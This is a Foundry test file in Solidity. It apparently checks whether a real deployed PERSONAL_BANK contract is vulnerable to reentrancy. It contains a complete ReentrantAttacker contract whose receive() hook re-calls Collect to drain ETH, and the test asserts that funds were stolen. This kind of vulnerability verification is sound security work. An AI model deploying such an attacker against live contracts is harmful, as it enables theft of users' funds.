// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/0x01f8c4e3fa3edeb29e514cba738d87ce8c091d3f.sol";

contract ReentrancyTest is Test {
    PERSONAL_BANK bank;
    LogFile logFileInstance;
    ReentrantAttacker attacker;
    address user = address(0xA11CE);
    uint256 minSum = 1 ether;

    function setUp() public {
        vm.deal(user, 100 ether);
        
        // Deploy contracts
        bank = new PERSONAL_BANK();
        logFileInstance = new LogFile();
        
        // Configure bank
        bank.SetLogFile(address(logFileInstance));
        bank.SetMinSum(minSum);
        
        userDeposits();
    }

    function userDeposits() private {
        vm.startPrank(user);
        bank.Deposit{value: 3 ether}();
        vm.stopPrank();
    }

    function testReentrancyAttack() public {
        attacker = new ReentrantAttacker(payable(address(bank)));
        vm.deal(address(attacker), 2 ether);
        
        // Attacker deposits funds using its own balance
        attacker.deposit();
        
        // Verify initial balances
        assertEq(address(bank).balance, 5 ether, "Initial bank balance");
        
        // Execute attack (2 reentrant calls after initial withdrawal)
        attacker.setAttackParams(1 ether, 2);

        console2.log("--- BEFORE-Trigger Attack ---");
        uint256 bankBalanceBefore = address(bank).balance;
        uint256 attackerBalanceBefore = address(attacker).balance;
        console2.log("Bank balance before attack: %d", bankBalanceBefore);
        console2.log("Attacker balance before attack: %d", attackerBalanceBefore);

        console2.log("--- Trigger Attack ---");
        attacker.attack();

        console2.log("--- AFTER-Trigger Attack ---");
        uint256 bankBalanceAfter = address(bank).balance;
        uint256 attackerBalanceAfter = address(attacker).balance;
        console2.log("Bank balance after attack: %d", bankBalanceAfter);
        console2.log("Attacker balance after attack: %d", attackerBalanceAfter);

        uint256 bankLoss = bankBalanceBefore - bankBalanceAfter;
        uint256 attackerGain = attackerBalanceAfter - attackerBalanceBefore;
        console2.log("Bank ETH loss: %d", bankLoss);
        console2.log("Attacker ETH gain: %d", attackerGain);

        // Vulnerability verdict based on balance changes
        if (attackerGain > attacker.balanceOf() && bankLoss == attackerGain) {
            console2.log("Vulnerability Exists: Attacker stole ETH via reentrancy");
        } else {
            console2.log("Vulnerability not Exist: No illegal balance changes detected");
        }

        // Verify bank was drained
        assertEq(
            address(bank).balance, 
            2 ether, 
            "Bank drained via reentrancy"
        );
        
        // Verify attacker received funds (3 withdrawals × 1 ETH)
        assertEq(
            address(attacker).balance,
            3 ether,
            "Attacker profits from reentrancy"
        );
    }
}

contract ReentrantAttacker {
    address payable bank;
    uint256 count;
    uint256 amount;
    uint256 maxReentrancy;

    constructor(address payable _bank) {
        bank = _bank;
    }

    function deposit() public {
        uint256 amountToDeposit = address(this).balance;
        (bool success, ) = bank.call{value: amountToDeposit}(abi.encodeWithSignature("Deposit()"));
        require(success, "Deposit failed");
    }

    function setAttackParams(uint256 _amount, uint256 _maxReentrancy) public {
        amount = _amount;
        maxReentrancy = _maxReentrancy;
    }

    function attack() public {
        (bool success, ) = bank.call(abi.encodeWithSignature("Collect(uint256)", amount));
        require(success, "Collect failed");
    }

    function balanceOf() public view returns (uint256) {
        return address(this).balance;
    }

    receive() external payable {
        count++;
        if (count <= maxReentrancy) {
            (bool success, ) = bank.call(abi.encodeWithSignature("Collect(uint256)", amount));
            require(success, "Reentrant Collect failed");
        }
    }
}